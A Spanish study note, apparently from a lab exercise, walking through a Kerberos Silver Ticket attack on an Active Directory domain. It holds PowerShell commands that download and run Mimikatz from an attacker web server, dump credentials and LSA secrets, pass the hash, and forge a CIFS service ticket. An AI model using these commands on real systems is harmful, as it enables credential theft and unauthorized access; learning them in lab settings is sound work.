
Técnica de creación de un TGS para un servicio específico cuando el hash del password del servicio se obtiene. Permite acceder sin autorización al servicio mediante un TGS.

Tiene un scope más estrecho que los Golden tickets ya que solo afectan al acceso de un servicio.

Ejemplo práctico:

```powershell
cd C:\tools
powershell -ep bypass
. .\PowerView.ps1
Get-Domain
```

![[Pasted image 20250403090854.png]]

![[Pasted image 20250403090914.png]]

Vamos a ver los dominios que tenemos permisos de administrador:

![[Pasted image 20250403090952.png]]

Nos introducimos en el dominio con ``Enter-PSession seclogs.research.SECURITY.local``

Iniciamos el HFS con en [[Hacking/Hacking/Pivoting y lateral movement/Lateral Movement/windows/Pass-the-Hash|Pass-the-Hash]] y añadimos los módulos de:
- Invoke-Mimikatz.ps1
- Invoke-TokenManipulation.ps1

```powershell
cd /

iex (New-Object Net.WebClient).DownloadString('http://ip/Invoke-TokenManipulation.ps1')
Invoke-TokenManipulation -Enumerate

iex (New-Object Net.WebClient).DownloadString('http://ip/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"priviledge::debug" "token::elevate" "sekurlsa::logonpassword"'
```


![[Pasted image 20250403091640.png]]

```powershell

#Abrimos un nuevo powershell

cd C:\tools
powershell -ep bypass
. .\PowerView.ps1


. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.lcoal /ntlm:hash /run:powershell.exe"'

#Sustituyendo el balor del hash por el valor obtenido anteriormente, el comando nos abrirá una nueva terminal con permisos de administrador. Comandos a partir de la nueva consola:

cd C:\tools
powershell -ep bypass

. .\Invoke-mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername pord.research.SECURITY.local
```

Nos interesa el hash de PROD
 ![[Pasted image 20250403093441.png]]

Abrimos otra window de powershell.

```powershell

ls \\prod.research.SECURITY.local\c$

#Con esto vemos que no tenemos permisos

cd C:\\
cd tools
powerhsell -ep bypass
. .\Invoke-Mimikatz.ps1

Invoke.Mimikatz -Command '"kerberos::golden /domain:research:SECURITY.local /sid:sid /target:prod.research.SECURITY.local /service:CIFS /rc4:hash /user:administrator /ptt"'

#Pese a que se hace referencia a un golden ticker, no lo es. El SID lo hemos sacado al principio, ek rc4 es el hash de prod
```

![[Pasted image 20250403094312.png]]

Ahora si ejecutamos el ``ls \\prod.research.SECURITY.local\c$

![[Pasted image 20250403094355.png]]

Vemos que tenemos permisos para listar.